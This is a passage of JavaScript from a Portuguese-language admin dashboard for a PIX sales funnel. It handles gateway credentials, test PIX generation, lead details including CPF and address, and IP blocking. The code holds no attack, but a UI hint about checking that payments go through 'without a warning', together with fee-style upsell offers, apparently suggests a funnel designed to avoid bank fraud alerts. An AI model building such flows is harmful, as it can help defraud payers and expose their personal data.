            if (pixelEventLead) pixelEventLead.checked = data.pixel?.events?.lead !== false;
            if (pixelEventCheckout) pixelEventCheckout.checked = data.pixel?.events?.checkout !== false;
            if (pixelEventPurchase) pixelEventPurchase.checked = data.pixel?.events?.purchase !== false;
            if (tiktokPixelEnabled) tiktokPixelEnabled.checked = !!data.tiktokPixel?.enabled;
            if (tiktokPixelId) tiktokPixelId.value = data.tiktokPixel?.id || '';
            if (tiktokPixelEventPage) tiktokPixelEventPage.checked = data.tiktokPixel?.events?.page_view !== false;
            if (tiktokPixelEventQuiz) tiktokPixelEventQuiz.checked = data.tiktokPixel?.events?.quiz_view !== false;
            if (tiktokPixelEventLead) tiktokPixelEventLead.checked = data.tiktokPixel?.events?.lead !== false;
            if (tiktokPixelEventCheckout) tiktokPixelEventCheckout.checked = data.tiktokPixel?.events?.checkout !== false;
            if (tiktokPixelEventPurchase) tiktokPixelEventPurchase.checked = data.tiktokPixel?.events?.purchase !== false;
        }

        if (hasUtmfyForm) {
            if (utmfyEnabled) utmfyEnabled.checked = !!data.utmfy?.enabled;
            if (utmfyEndpoint) utmfyEndpoint.value = data.utmfy?.endpoint || '';
            if (utmfyApi) utmfyApi.value = data.utmfy?.apiKey || '';
            if (pushcutEnabled) pushcutEnabled.checked = !!data.pushcut?.enabled;
            if (pushcutPixCreated) {
                pushcutPixCreated.value =
                    data.pushcut?.pixCreatedUrl ||
                    data.pushcut?.pixCreatedUrls?.[0] ||
                    data.pushcut?.pixCreatedUrl2 ||
                    data.pushcut?.pixCreatedUrls?.[1] ||
                    '';
            }
            if (pushcutPixConfirmed) {
                pushcutPixConfirmed.value =
                    data.pushcut?.pixConfirmedUrl ||
                    data.pushcut?.pixConfirmedUrls?.[0] ||
                    data.pushcut?.pixConfirmedUrl2 ||
                    data.pushcut?.pixConfirmedUrls?.[1] ||
                    '';
            }
            if (pushcutCreatedTitle) pushcutCreatedTitle.value = data.pushcut?.templates?.pixCreatedTitle || '';
            if (pushcutCreatedMessage) pushcutCreatedMessage.value = data.pushcut?.templates?.pixCreatedMessage || '';
            if (pushcutConfirmedTitle) pushcutConfirmedTitle.value = data.pushcut?.templates?.pixConfirmedTitle || '';
            if (pushcutConfirmedMessage) pushcutConfirmedMessage.value = data.pushcut?.templates?.pixConfirmedMessage || '';
        }

        if (hasPaymentsForm) {
            const payments = data.payments || {};
            const gateways = payments.gateways || {};
            const ghostspay = gateways.ghostspay || {};
            const sunize = gateways.sunize || {};
            const paradise = gateways.paradise || {};
            const atomopay = gateways.atomopay || {};
            const gatewayOrder = normalizeGatewayOrderForUi(payments.gatewayOrder || [], payments.activeGateway || 'ghostspay');
            const activeGateway = normalizeGatewayKey(gatewayOrder[0] || payments.activeGateway || 'ghostspay');

            if (paymentsActiveGateway) paymentsActiveGateway.value = activeGateway;
            if (gatewayGhostspayEnabled) gatewayGhostspayEnabled.checked = !!ghostspay.enabled;
            if (gatewayGhostspayBaseUrl) gatewayGhostspayBaseUrl.value = ghostspay.baseUrl || '';
            if (gatewayGhostspaySecretKey) gatewayGhostspaySecretKey.value = ghostspay.secretKey || '';
            if (gatewayGhostspayCompanyId) gatewayGhostspayCompanyId.value = ghostspay.companyId || '';
            if (gatewayGhostspayWebhookToken) gatewayGhostspayWebhookToken.value = ghostspay.webhookToken || '';
            if (gatewaySunizeEnabled) gatewaySunizeEnabled.checked = !!sunize.enabled;
            if (gatewaySunizeBaseUrl) gatewaySunizeBaseUrl.value = sunize.baseUrl || '';
            if (gatewaySunizeApiKey) gatewaySunizeApiKey.value = sunize.apiKey || '';
            if (gatewaySunizeApiSecret) gatewaySunizeApiSecret.value = sunize.apiSecret || '';
            if (gatewayParadiseEnabled) gatewayParadiseEnabled.checked = !!paradise.enabled;
            if (gatewayParadiseBaseUrl) gatewayParadiseBaseUrl.value = paradise.baseUrl || '';
            if (gatewayParadiseApiKey) gatewayParadiseApiKey.value = paradise.apiKey || '';
            if (gatewayParadiseProductHash) gatewayParadiseProductHash.value = paradise.productHash || '';
            if (gatewayParadiseOrderbumpHash) gatewayParadiseOrderbumpHash.value = paradise.orderbumpHash || '';
            if (gatewayParadiseSource) gatewayParadiseSource.value = paradise.source || '';
            if (gatewayParadiseDescription) gatewayParadiseDescription.value = paradise.description || '';
            if (gatewayAtomopayEnabled) gatewayAtomopayEnabled.checked = !!atomopay.enabled;
            if (gatewayAtomopayBaseUrl) gatewayAtomopayBaseUrl.value = atomopay.baseUrl || '';
            if (gatewayAtomopayApiToken) gatewayAtomopayApiToken.value = atomopay.apiToken || '';
            if (gatewayAtomopayOfferHash) gatewayAtomopayOfferHash.value = atomopay.offerHash || '';
            if (gatewayAtomopayProductHash) gatewayAtomopayProductHash.value = atomopay.productHash || '';
            if (gatewayAtomopayIofOfferHash) gatewayAtomopayIofOfferHash.value = atomopay.iofOfferHash || '';
            if (gatewayAtomopayIofProductHash) gatewayAtomopayIofProductHash.value = atomopay.iofProductHash || '';
            if (gatewayAtomopayCorreiosOfferHash) gatewayAtomopayCorreiosOfferHash.value = atomopay.correiosOfferHash || '';
            if (gatewayAtomopayCorreiosProductHash) gatewayAtomopayCorreiosProductHash.value = atomopay.correiosProductHash || '';
            if (gatewayAtomopayExpressoOfferHash) gatewayAtomopayExpressoOfferHash.value = atomopay.expressoOfferHash || '';
            if (gatewayAtomopayExpressoProductHash) gatewayAtomopayExpressoProductHash.value = atomopay.expressoProductHash || '';
            if (gatewayAtomopayWebhookToken) gatewayAtomopayWebhookToken.value = atomopay.webhookToken || '';

            syncGatewaySwitches();
            syncGatewayOrderUi(gatewayOrder);
            setCurrentGatewayCard(activeGateway);
            setGatewayCardOpen(activeGateway, true);

            if (metricActiveGateway) {
                metricActiveGateway.textContent = gatewayLabelForUi(activeGateway);
            }
        }

        if (hasFeatureForm) {
            featureOrderbump.checked = data.features?.orderbump !== false;
        }
    };

    const buildLeadFieldsHtml = (items = []) => {
        const body = (Array.isArray(items) ? items : [])
            .filter((item) => item && item.label)
            .map((item) => `
                <div class="lead-detail-field${item.accent ? ' lead-detail-field--accent' : ''}${item.mono ? ' lead-detail-field--code' : ''}${item.wide ? ' lead-detail-field--wide' : ''}">
                    <strong>${escapeHtml(item.label || '-')}</strong>
                    <span class="lead-detail-field__value">${escapeHtml(formatDetailValue(item.value, item.fallback || '-'))}</span>
                </div>
            `)
            .join('');

        return body || '<span class="admin-muted">Sem dados.</span>';
    };

    const buildLeadSummaryCardsHtml = (items = []) => {
        return (Array.isArray(items) ? items : [])
            .filter((item) => item && item.label)
            .map((item) => `
                <article class="lead-detail-summary-card">
                    <span>${escapeHtml(item.label || '-')}</span>
                    <strong>${escapeHtml(formatDetailValue(item.value, item.fallback || '-'))}</strong>
                </article>
            `)
            .join('');
    };

    const buildLeadStatCardsHtml = (items = []) => {
        return (Array.isArray(items) ? items : [])
            .filter((item) => item && item.label)
            .map((item) => `
                <article class="lead-detail-stat">
                    <span>${escapeHtml(item.label || '-')}</span>
                    <strong>${escapeHtml(formatDetailValue(item.value, item.fallback || '-'))}</strong>
                </article>
            `)
            .join('');
    };

    const LEAD_STATUS_CLASS_MAP = {
        paid: 'status-pill--paid',
        pending: 'status-pill--pix-created',
        refunded: 'status-pill--refunded',
        refused: 'status-pill--danger',
        neutral: 'status-pill--neutral',
        none: 'status-pill--neutral'
    };

    const getLeadDisplayData = (source) => {
        if (source?.display && typeof source.display === 'object') return source.display;
        if (source?.readable?.display && typeof source.readable.display === 'object') return source.readable.display;
        return {};
    };

    const getLeadStatusClass = (tone) => {
        const key = String(tone || '').trim().toLowerCase();
        return LEAD_STATUS_CLASS_MAP[key] || LEAD_STATUS_CLASS_MAP.neutral;
    };

    const summarizeLeadPaymentItem = (item = {}) => {
        const label = formatDetailValue(item?.shortLabel || item?.label, 'PIX');
        const status = String(item?.status || '').trim().toLowerCase();
        if (status === 'paid') return `${label} PAGO`;
        if (status === 'pending') return `${label} GERADO`;
        if (status === 'refused') return `${label} RECUSADO`;
        if (status === 'refunded') return `${label} ESTORNADO`;
        return '';
    };

    const buildLeadStatusPillsHtml = (items = [], { emptyLabel = '' } = {}) => {
        const list = Array.isArray(items) ? items : [];
        if (!list.length) {
            return emptyLabel
                ? `<span class="status-pill status-pill--neutral">${escapeHtml(emptyLabel)}</span>`
                : '';
        }

        return list
            .map((item) => `
                <span class="status-pill ${getLeadStatusClass(item?.tone || item?.status)}${item?.current ? ' status-pill--current' : ''}">
                    ${escapeHtml(summarizeLeadPaymentItem(item))}
                </span>
            `)
            .join('');
    };

    const formatLeadShortCode = (value, length = 8) => {
        const text = String(value || '').trim();
        if (!text) return '-';
        if (text.length <= length) return text;
        return text.slice(-Math.max(4, Number(length) || 8));
    };

    const buildGatewayTestQrFallbackUrl = (codeText = '') => {
        const clean = String(codeText || '').trim();
        if (!clean) return '';
        const url = new URL('https://quickchart.io/qr');
        url.searchParams.set('text', clean);
        url.searchParams.set('size', '620');
        url.searchParams.set('margin', '2');
        url.searchParams.set('ecLevel', 'M');
        return url.toString();
    };

    const resolveGatewayTestQrSrc = (result = {}) => {
        const qrSource = String(result?.paymentQrUrl || result?.paymentCodeBase64 || '').trim();
        if (qrSource) {
            if (/^https?:\/\//i.test(qrSource) || qrSource.startsWith('data:image')) {
                return qrSource;
            }
            return `data:image/png;base64,${qrSource}`;
        }
        return buildGatewayTestQrFallbackUrl(result?.paymentCode || '');
    };

    const setGatewayTestModalVisible = (visible) => {
        if (!gatewayTestModal) return;
        gatewayTestModal.classList.toggle('hidden', !visible);
        gatewayTestModal.setAttribute('aria-hidden', visible ? 'false' : 'true');
        document.body.classList.toggle('modal-open', !!visible);
    };

    const resetGatewayTestResults = () => {
        if (gatewayTestResults) {
            gatewayTestResults.innerHTML = `
                <div class="gateway-test-empty">
                    Defina o valor, escolha os gateways e gere os PIXs de teste.
                </div>
            `;
        }
        if (gatewayTestStatus) gatewayTestStatus.textContent = '';
    };

    const syncGatewayTestSelectionDefaults = () => {
        if (gatewayTestGhostspay) gatewayTestGhostspay.checked = gatewayGhostspayEnabled?.checked !== false;
        if (gatewayTestSunize) gatewayTestSunize.checked = gatewaySunizeEnabled?.checked === true;
        if (gatewayTestParadise) gatewayTestParadise.checked = gatewayParadiseEnabled?.checked === true;
        if (gatewayTestAtomopay) gatewayTestAtomopay.checked = gatewayAtomopayEnabled?.checked === true;
        if (gatewayTestAmount && !String(gatewayTestAmount.value || '').trim()) {
            gatewayTestAmount.value = '19,90';
        }
    };

    const getSelectedGatewayTests = () => {
        const gateways = [];
        if (gatewayTestGhostspay?.checked) gateways.push('ghostspay');
        if (gatewayTestSunize?.checked) gateways.push('sunize');
        if (gatewayTestParadise?.checked) gateways.push('paradise');
        if (gatewayTestAtomopay?.checked) gateways.push('atomopay');
        return gateways;
    };

    const renderGatewayTestResults = (results = [], amount = 0) => {
        if (!gatewayTestResults) return;
        const list = Array.isArray(results) ? results : [];
        if (!list.length) {
            resetGatewayTestResults();
            return;
        }
        gatewayTestResults.innerHTML = list.map((result) => {
            const gatewayLabel = escapeHtml(formatDetailValue(result?.gatewayLabel || result?.gateway));
            const amountText = escapeHtml(formatCurrency(Number(result?.amount || amount || 0)));
            const qrSrc = resolveGatewayTestQrSrc(result);
            const statusText = escapeHtml(formatDetailValue(result?.statusRaw, result?.ok ? 'gerado' : 'falha'));
            const txidText = escapeHtml(formatDetailValue(result?.txid, '-'));
            const externalIdText = escapeHtml(formatDetailValue(result?.externalId, '-'));
            const paymentCode = String(result?.paymentCode || '').trim();
            const detailRaw = String(result?.detail || '').trim();
            const detailText = escapeHtml(detailRaw);
            return `
                <article class="gateway-test-card${result?.ok ? '' : ' gateway-test-card--error'}">
                    <div class="gateway-test-card__top">
                        <div class="gateway-test-card__title-group">
                            <span class="gateway-test-card__eyebrow">Gateway de teste</span>
                            <div class="gateway-test-card__head">
                                <div>
                                    <h4>${gatewayLabel}</h4>
                                    <p class="gateway-test-card__subtitle">${result?.ok ? 'PIX gerado para validacao manual do ambiente.' : 'Falha ao gerar PIX de teste neste gateway.'}</p>
                                </div>
                                <span class="admin-chip${result?.ok ? '' : ' admin-chip--danger'}">${result?.ok ? 'Gerado' : 'Falhou'}</span>
                            </div>
                        </div>
                        <div class="gateway-test-card__meta">
                            <span><small>Valor</small><strong>${amountText}</strong></span>
                            <span><small>Status bruto</small><strong>${statusText}</strong></span>
                        </div>
                    </div>
                    <div class="gateway-test-card__body${result?.ok && qrSrc ? '' : ' gateway-test-card__body--compact'}">
                        ${result?.ok && qrSrc ? `
                        <div class="gateway-test-card__qr-block">
                            <div class="gateway-test-card__qr">
                                <img src="${escapeHtml(qrSrc)}" alt="QR Code ${gatewayLabel}" loading="lazy" />
                            </div>
                            <p class="gateway-test-card__qr-hint">Escaneie este QR no app do banco para validar se o gateway esta aprovando sem aviso.</p>
                        </div>
                        ` : ''}
                        <div class="gateway-test-card__info">
                            <div class="gateway-test-card__details">
                                <span>
                                    <small>TXID</small>
                                    <code>${txidText}</code>
                                </span>
                                <span>
                                    <small>Referencia</small>
                                    <code>${externalIdText}</code>
                                </span>
                            </div>
                            ${paymentCode ? `
                        <div class="gateway-test-card__copy">
                            <input type="text" value="${escapeHtml(paymentCode)}" readonly />
                            <button class="btn-secondary gateway-test-copy" type="button" data-gateway-test-copy="${escapeHtml(paymentCode)}">Copiar codigo</button>
                        </div>
                            ` : ''}
                            ${detailRaw ? `<div class="${result?.ok ? 'admin-detail-alert' : 'gateway-test-card__error'}">${detailText}</div>` : ''}
                        </div>
                    </div>
                </article>
            `;
        }).join('');
    };

    const openGatewayTestModal = () => {
        syncGatewayTestSelectionDefaults();
        resetGatewayTestResults();
        setGatewayTestModalVisible(true);
        gatewayTestAmount?.focus();
        gatewayTestAmount?.select();
    };

    const closeGatewayTestModal = () => {
        if (gatewayTestRunning) return;
        setGatewayTestModalVisible(false);
    };

    const runGatewayTests = async () => {
        if (!gatewayTestGenerate || gatewayTestRunning) return;
        const amountRaw = String(gatewayTestAmount?.value || '').trim();
        const normalizedAmount = Number(amountRaw.replace(',', '.'));
        const gateways = getSelectedGatewayTests();
        if (!Number.isFinite(normalizedAmount) || normalizedAmount < 1) {
            showToast('Informe um valor valido a partir de R$ 1,00.', 'error');
            gatewayTestAmount?.focus();
            return;
        }
        if (!gateways.length) {
            showToast('Selecione ao menos um gateway para testar.', 'error');
            return;
        }

        gatewayTestRunning = true;
        gatewayTestGenerate.disabled = true;
        if (gatewayTestReset) gatewayTestReset.disabled = true;
        if (gatewayTestBtn) gatewayTestBtn.disabled = true;
        if (gatewayTestStatus) gatewayTestStatus.textContent = 'Gerando PIXs de teste direto nos gateways salvos...';
        if (gatewayTestResults) {
            gatewayTestResults.innerHTML = `<div class="gateway-test-empty">Gerando os testes. Aguarde alguns segundos...</div>`;
        }

        try {
            const res = await adminFetch('/api/admin/gateway-test-pix', {
                method: 'POST',
                body: JSON.stringify({
                    amount: normalizedAmount,
                    gateways
                })
            });
            const data = await res.json().catch(() => ({}));

            if (!res.ok || data?.ok === false) {
                if (gatewayTestStatus) gatewayTestStatus.textContent = data?.error || 'Falha ao gerar os testes.';
                if (gatewayTestResults) {
                    gatewayTestResults.innerHTML = `<div class="gateway-test-empty">${escapeHtml(data?.error || 'Falha ao gerar os testes.')}</div>`;
                }
                showToast(data?.error || 'Falha ao gerar os testes dos gateways.', 'error');
                return;
            }

            renderGatewayTestResults(data?.results || [], Number(data?.amount || normalizedAmount));
            const okCount = (Array.isArray(data?.results) ? data.results : []).filter((item) => item?.ok).length;
            const failCount = (Array.isArray(data?.results) ? data.results : []).filter((item) => !item?.ok).length;
            if (gatewayTestStatus) {
                gatewayTestStatus.textContent = `Gerados ${okCount} gateway(s) com sucesso. Falhas: ${failCount}.`;
            }
            showToast(
                okCount > 0
                    ? `Teste concluido. ${okCount} gateway(s) geraram PIX.`
                    : 'Nenhum gateway conseguiu gerar PIX de teste.',
                okCount > 0 ? 'success' : 'error'
            );
        } catch (_error) {
            if (gatewayTestStatus) gatewayTestStatus.textContent = 'Falha de rede ao gerar os testes.';
            if (gatewayTestResults) {
                gatewayTestResults.innerHTML = '<div class="gateway-test-empty">Falha de rede ao gerar os testes. Tente novamente.</div>';
            }
            showToast('Falha de rede ao gerar os testes dos gateways.', 'error');
        } finally {
            gatewayTestRunning = false;
            gatewayTestGenerate.disabled = false;
            if (gatewayTestReset) gatewayTestReset.disabled = false;
            if (gatewayTestBtn) gatewayTestBtn.disabled = false;
        }
    };

    const formatJourneySpan = (pages = []) => {
        const list = Array.isArray(pages) ? pages : [];
        const first = list[0]?.createdAt;
        const last = list[list.length - 1]?.createdAt;
        if (!first || !last) return '-';
        const start = new Date(first);
        const end = new Date(last);
        if (Number.isNaN(start.getTime()) || Number.isNaN(end.getTime())) return '-';
        const diffMs = Math.max(0, end.getTime() - start.getTime());
        const totalMin = Math.round(diffMs / 60000);
        if (totalMin < 1) return 'menos de 1 min';
        if (totalMin < 60) return `${totalMin} min`;
        const hours = Math.floor(totalMin / 60);
        const minutes = totalMin % 60;
        return minutes ? `${hours}h ${minutes}m` : `${hours}h`;
    };

    const formatTransactionLookupState = (item) => {
        const bucket = String(item?.bucket || '').trim().toLowerCase();
        if (bucket === 'confirmed') return 'Pago';
        if (bucket === 'pending') return 'Pendente';
        if (bucket === 'refunded') return 'Estornado';
        if (bucket === 'refused') return 'Recusado';
        if (item?.ok === false) return 'Falha na consulta';
        return 'Nao consultada';
    };

    const renderLeadTransactionLookup = (lookup) => {
        if (leadDetailTransactionStatus) {
            leadDetailTransactionStatus.textContent = lookup ? formatTransactionLookupState(lookup) : 'Nao consultada';
        }
        if (leadDetailTransactionSummary) {
            if (!lookup) {
                leadDetailTransactionSummary.innerHTML = '<div class="admin-muted">Nenhuma consulta feita ainda para esta transacao.</div>';
            } else if (lookup?.ok === false) {
                leadDetailTransactionSummary.innerHTML = buildLeadFieldsHtml([
                    { label: 'TXID', value: lookup?.txid, mono: true, wide: true },
                    { label: 'Gateway', value: lookup?.gateway },
                    { label: 'Status HTTP', value: lookup?.statusCode, mono: true },
                    { label: 'Detalhe', value: lookup?.detail, wide: true, accent: true }
                ]);
            } else {
                leadDetailTransactionSummary.innerHTML = buildLeadFieldsHtml([
                    { label: 'Gateway', value: lookup?.gatewayLabel || lookup?.gateway, accent: true },
                    { label: 'TXID', value: lookup?.txid, mono: true, wide: true },
                    { label: 'Status bruto', value: lookup?.statusRaw, mono: true },
                    { label: 'Status normalizado', value: formatTransactionLookupState(lookup), accent: true },
                    { label: 'Status UTMify', value: lookup?.utmifyStatus, mono: true },
                    { label: 'Consultado em', value: formatDateTime(lookup?.changedAt) },
                    { label: 'Lead sincronizado', value: Number(lookup?.updatedRows || 0) > 0 ? 'Sim' : 'Nao', accent: Number(lookup?.updatedRows || 0) > 0 },
                    { label: 'Linhas sincronizadas', value: String(Number(lookup?.updatedRows || 0)), mono: true },
                    { label: 'Regressao ignorada', value: lookup?.skippedRegression === true ? 'Sim' : 'Nao' },
                    { label: 'Order/Session fallback', value: lookup?.sessionIdFallback, mono: true, wide: true },
                    { label: 'Valor', value: Number(lookup?.amount || 0) ? formatCurrency(Number(lookup.amount || 0)) : '-' },
                    { label: 'Taxa', value: Number(lookup?.fee || 0) ? formatCurrency(Number(lookup.fee || 0)) : 'R$ 0,00' },
                    { label: 'Comissao', value: Number(lookup?.commission || 0) ? formatCurrency(Number(lookup.commission || 0)) : 'R$ 0,00' }
                ]);
            }
        }
        if (leadDetailTransactionPayload) {
            leadDetailTransactionPayload.textContent = lookup
                ? JSON.stringify(lookup?.transaction || lookup, null, 2)
                : 'Clique em "Consultar transacao" para consultar o gateway e sincronizar o status deste lead.';
            leadDetailTransactionPayload.scrollTop = 0;
        }
    };

    const setLeadDetailModalVisible = (visible) => {
        if (!leadDetailModal) return;
        leadDetailModal.classList.toggle('hidden', !visible);
        leadDetailModal.setAttribute('aria-hidden', visible ? 'false' : 'true');
        document.body.classList.toggle('modal-open', !!visible);
    };

    const closeLeadDetailModal = () => {
        currentLeadDetail = null;
        setLeadDetailModalVisible(false);
    };

    const renderIpBlacklist = (entries = []) => {
        if (!ipBlacklistBody) return;
        currentIpBlacklist = Array.isArray(entries) ? entries : [];
        ipBlacklistBody.innerHTML = '';

        currentIpBlacklist.forEach((entry) => {
            const tr = document.createElement('tr');
            const lead = entry?.lead || {};
            tr.innerHTML = `
                <td class="lead-cell">${escapeHtml(formatDetailValue(entry?.ip))}</td>
                <td class="lead-cell lead-cell--name"><strong>${escapeHtml(formatDetailValue(lead?.name))}</strong></td>
                <td class="lead-cell lead-cell--email">${escapeHtml(formatDetailValue(lead?.email))}</td>
                <td class="lead-cell">${escapeHtml(formatDetailValue(lead?.rewardName))}</td>
                <td class="lead-cell">${escapeHtml(formatDetailValue(lead?.shippingName))}</td>
                <td class="lead-cell">${escapeHtml(formatDateTime(entry?.blockedAt))}</td>
                <td class="lead-cell">
                    <button class="admin-quiz-btn" type="button" data-remove-block-ip="${escapeHtml(entry?.ip || '')}">Remover</button>
                </td>
            `;
            ipBlacklistBody.appendChild(tr);
        });

        if (ipBlacklistCount) ipBlacklistCount.textContent = String(currentIpBlacklist.length);
        if (ipBlacklistEmpty) ipBlacklistEmpty.classList.toggle('hidden', currentIpBlacklist.length > 0);
    };

    const loadIpBlacklist = async () => {
        if (!ipBlacklistBody) return;
        const res = await adminFetch('/api/admin/ip-blacklist');
        const data = await res.json().catch(() => ({}));
        if (!res.ok) {
            showToast(data?.error || 'Falha ao carregar blacklist de IP.', 'error');
            return;
        }
        renderIpBlacklist(data?.entries || []);
    };

    const renderLeadDetail = (detail) => {
        if (!leadDetailModal || !detail) return;
        currentLeadDetail = detail;

        const payload = detail?.payload || {};
        const display = getLeadDisplayData(detail);
        const metadata = payload?.metadata || {};
        const payloadUtm = payload?.utm || {};
        const payloadPersonal = payload?.personal || {};
        const payloadAddress = payload?.address || {};
        const payloadExtra = payload?.extra || {};
        const payloadShipping = payload?.shipping || {};
        const payloadReward = payload?.reward || {};
        const payloadBump = payload?.bump || {};
        const payloadUpsell = payload?.upsell || {};
        const pages = Array.isArray(detail?.pageviews) ? detail.pageviews : [];
        const rewardName = formatDetailValue(detail?.reward?.name);
        const shippingName = formatDetailValue(detail?.shipping?.name);
        const paymentItems = Array.isArray(detail?.payment?.payments) ? detail.payment.payments : (Array.isArray(display?.payments) ? display.payments : []);
        const paymentPillsHtml = buildLeadStatusPillsHtml(paymentItems);
        const paymentSummary = formatDetailValue(detail?.payment?.paymentSummary || display?.paymentSummary, 'Sem pagamentos');
        const journeyLabel = formatDetailValue(detail?.payment?.journey?.label || display?.journey?.label);
        const chargeLabel = formatDetailValue(detail?.payment?.charge?.label || display?.charge?.label);
        const chargeOfferLabel = formatDetailValue(detail?.payment?.charge?.offerLabel || display?.charge?.offerLabel);
        const chargeStatusLabel = formatDetailValue(detail?.payment?.charge?.statusLabel || display?.charge?.statusLabel);
        const selectionSummary = formatDetailValue(detail?.payment?.selection?.summary || display?.selection?.summary);
        const currentAmountValue = Number(detail?.payment?.amount);
        const valueText = Number.isFinite(currentAmountValue) ? formatCurrency(currentAmountValue) : '-';
        const clientIp = formatDetailValue(detail?.device?.clientIp);
        const blockedEntry = detail?.block?.entry || null;
        const isBlocked = detail?.block?.blocked === true;
        const sessionId = formatDetailValue(detail?.sessionId);
        const journeySpan = formatJourneySpan(pages);
        const firstPageAt = pages[0]?.createdAt ? formatDateTime(pages[0].createdAt) : '-';
        const lastPageAt = pages[pages.length - 1]?.createdAt ? formatDateTime(pages[pages.length - 1].createdAt) : '-';
        const gatewayLabel = formatDetailValue(detail?.payment?.gatewayLabel);
        const statusLabel = formatDetailValue(detail?.readable?.status_funil);
        const eventLabel = formatDetailValue(detail?.readable?.evento);

        if (leadDetailTitle) {
            leadDetailTitle.textContent = formatDetailValue(detail?.customer?.name, 'Lead sem nome');
        }
        if (leadDetailSubtitle) {
            leadDetailSubtitle.textContent = `${sessionId} | ${gatewayLabel} | ${paymentSummary}`;
        }
        if (leadDetailMeta) {
            leadDetailMeta.innerHTML = `
                ${paymentPillsHtml}
                <span class="admin-quiz-chip">${escapeHtml(journeyLabel)}</span>
                <span class="admin-quiz-chip">${escapeHtml(chargeOfferLabel)}</span>
                <span class="admin-quiz-chip">${escapeHtml(valueText)}</span>
                <span class="admin-quiz-chip">${escapeHtml(rewardName)}</span>
                <span class="admin-quiz-chip">${escapeHtml(shippingName)}</span>
                <span class="admin-quiz-chip">${escapeHtml(isBlocked ? 'IP bloqueado' : 'IP livre')}</span>
            `;
        }

        if (leadDetailBlockState) {
            if (isBlocked && blockedEntry) {
                leadDetailBlockState.textContent = `IP bloqueado: ${clientIp} em ${formatDateTime(blockedEntry?.blockedAt)}. Motivo: ${formatDetailValue(blockedEntry?.reason, 'Bloqueio manual')}.`;
            } else {
                leadDetailBlockState.textContent = `IP atual do lead: ${clientIp}. O bloqueio e exato por IP e nao usa range.`;
            }
            leadDetailBlockState.classList.remove('hidden');
        }
        if (leadDetailBlockBtn) {
            leadDetailBlockBtn.disabled = !detail?.device?.clientIp || isBlocked;
            leadDetailBlockBtn.classList.toggle('hidden', isBlocked);
        }
        if (leadDetailUnblockBtn) {
            leadDetailUnblockBtn.disabled = !isBlocked;
            leadDetailUnblockBtn.classList.toggle('hidden', !isBlocked);
        }
        if (leadDetailLookupBtn) {
            leadDetailLookupBtn.disabled = !detail?.payment?.pixTxid || !detail?.payment?.gateway;
        }
        if (leadDetailLookupStatus) {
            leadDetailLookupStatus.textContent = detail?.payment?.pixTxid
                ? 'Consulta individual pronta para sincronizar o lead.'
                : 'Este lead nao tem TXID valido para consulta.';
        }

        if (leadDetailSummary) {
            leadDetailSummary.innerHTML = buildLeadSummaryCardsHtml([
                { label: 'Valor atual', value: valueText },
                { label: 'Selecao base', value: selectionSummary },
                { label: 'Cobranca atual', value: chargeOfferLabel },
                { label: 'Pagamentos', value: paymentSummary },
                { label: 'Ultima atualizacao', value: formatDateTime(detail?.payment?.updatedAt || detail?.payment?.createdAt) }
            ]);
        }

        if (leadDetailOverview) {
            leadDetailOverview.innerHTML = buildLeadStatCardsHtml([
                { label: 'Jornada atual', value: journeyLabel },
                { label: 'Cobranca atual', value: chargeLabel },
                { label: 'Oferta atual', value: chargeOfferLabel },
                { label: 'Status atual', value: chargeStatusLabel },
                { label: 'Pagamentos salvos', value: paymentSummary },
                { label: 'Gateway', value: gatewayLabel },
                { label: 'Status funil', value: statusLabel },
                { label: 'Evento', value: eventLabel },
                { label: 'Status bruto', value: detail?.payment?.pixStatusRaw },
                { label: 'Lead criado', value: formatDateTime(detail?.payment?.createdAt) },
                { label: 'Lead atualizado', value: formatDateTime(detail?.payment?.updatedAt) },
                { label: 'Selecao base', value: selectionSummary },
                { label: 'Pages registradas', value: String(pages.length || 0) },
                { label: 'Inicio da jornada', value: firstPageAt },
                { label: 'Fim da jornada', value: lastPageAt },
                { label: 'Jornada salva', value: journeySpan },
                { label: 'IP bloqueado', value: isBlocked ? 'Sim' : 'Nao' }
            ]);
        }

        if (leadDetailIdentity) {
            leadDetailIdentity.innerHTML = buildLeadFieldsHtml([
                { label: 'Nome', value: detail?.customer?.name, accent: true },
                { label: 'Email', value: detail?.customer?.email, accent: true },
                { label: 'Telefone', value: detail?.customer?.phone, mono: true },
                { label: 'CPF', value: detail?.customer?.cpf, mono: true },
                { label: 'Nascimento', value: payloadPersonal?.birth },
                { label: 'Session ID', value: sessionId, mono: true, wide: true },
                { label: 'Order ID payload', value: payload?.orderId || metadata?.orderId, mono: true },
                { label: 'Event ID front', value: payload?.addPaymentInfoEventId, mono: true }
            ]);
        }

        if (leadDetailAddress) {
            leadDetailAddress.innerHTML = buildLeadFieldsHtml([
                { label: 'CEP', value: detail?.address?.cep, mono: true },
                { label: 'Bairro', value: detail?.address?.neighborhood },
                { label: 'Endereco', value: detail?.address?.addressLine, wide: true, accent: true },
                { label: 'Numero', value: detail?.address?.number },
                { label: 'Complemento', value: detail?.address?.complement },
                { label: 'Cidade', value: detail?.address?.city },
                { label: 'Estado', value: detail?.address?.state },
                { label: 'Referencia', value: detail?.address?.reference, wide: true },
                { label: 'Street line payload', value: payloadAddress?.streetLine, wide: true },
                { label: 'City line payload', value: payloadAddress?.cityLine, wide: true },
                { label: 'Sem numero', value: payloadExtra?.noNumber === true ? 'Sim' : (payloadExtra?.noNumber === false ? 'Nao' : '-') },
                { label: 'Sem complemento', value: payloadExtra?.noComplement === true ? 'Sim' : (payloadExtra?.noComplement === false ? 'Nao' : '-') }
            ]);
        }

        if (leadDetailPayment) {
            leadDetailPayment.innerHTML = buildLeadFieldsHtml([
                { label: 'Pagamentos salvos', value: paymentSummary, wide: true, accent: true },
                { label: 'Selecao base', value: selectionSummary, wide: true, accent: true },
                { label: 'Jornada atual', value: journeyLabel },
                { label: 'Cobranca atual', value: chargeLabel },
                { label: 'Oferta atual', value: chargeOfferLabel, wide: true },
                { label: 'Status atual', value: chargeStatusLabel, accent: true },
                { label: 'Gateway label', value: gatewayLabel, accent: true },
                { label: 'Gateway key', value: detail?.payment?.gateway, mono: true },
                { label: 'Status funil', value: detail?.payment?.status, accent: true },
                { label: 'Evento', value: detail?.payment?.event },
                { label: 'Valor atual', value: valueText, accent: true },
                { label: 'TXID atual', value: detail?.payment?.pixTxid, mono: true, wide: true },
                { label: 'Status bruto gateway', value: detail?.payment?.pixStatusRaw, mono: true },
                { label: 'Produto selecionado', value: rewardName },
                { label: 'Produto ID', value: detail?.reward?.id || payloadReward?.id, mono: true },
                { label: 'Preco produto', value: detail?.reward?.price ? formatCurrency(detail.reward.price) : '-' },
                { label: 'Frete selecionado', value: shippingName },
